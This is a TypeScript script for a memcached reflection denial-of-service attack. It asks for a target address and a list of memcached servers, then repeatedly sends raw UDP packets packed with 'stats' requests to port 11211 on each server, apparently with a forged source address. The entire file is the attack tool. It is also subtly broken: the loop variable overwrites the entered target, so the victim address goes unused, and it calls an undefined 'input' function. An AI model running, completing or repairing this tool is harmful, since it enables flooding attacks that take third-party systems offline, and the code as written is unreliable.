import * as fs from "fs"
import PacketUtils from "./PacketUtils"
import RawUdp from "./RawUDP"

var ip = input("Enter IP Adress: ");
var port = input("Enter Target Port");
var list = input("Enter The Memache's List File (Press Enter If You Don't Have A List File): ");

function attack() {
  var command = Buffer.from("stats\r\nstats\r\nstats\r\nstats items\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\n");
  var buffer = new Buffer(8);

  buffer.writeUInt16BE(0, 0);
  buffer.writeUInt16BE(0, 2);
  buffer.writeUInt16BE(1, 4);
  buffer.writeUInt16BE(0, 6);

  buffer = Buffer.concat([buffer, command]);

  var rawUdp = new RawUdp();

  return function (sourceIP: string, sourcePort: number, targetIP: string, targetPort: number) {
    var sip = PacketUtils.stringToIpAddress(sourceIP);
    var dip = PacketUtils.stringToIpAddress(targetIP);
    rawUdp.send(sip, sourcePort, dip, targetPort, buffer);
  }
}

var sendAttackPacket = attack();
var list = fs.readFileSync(list).toString().split("\n");

function loop() {
  for (const ip of list) {
    sendAttackPacket(ip, port, ip, 11211)
  }
  setTimeout(loop, 15);
}

loop();
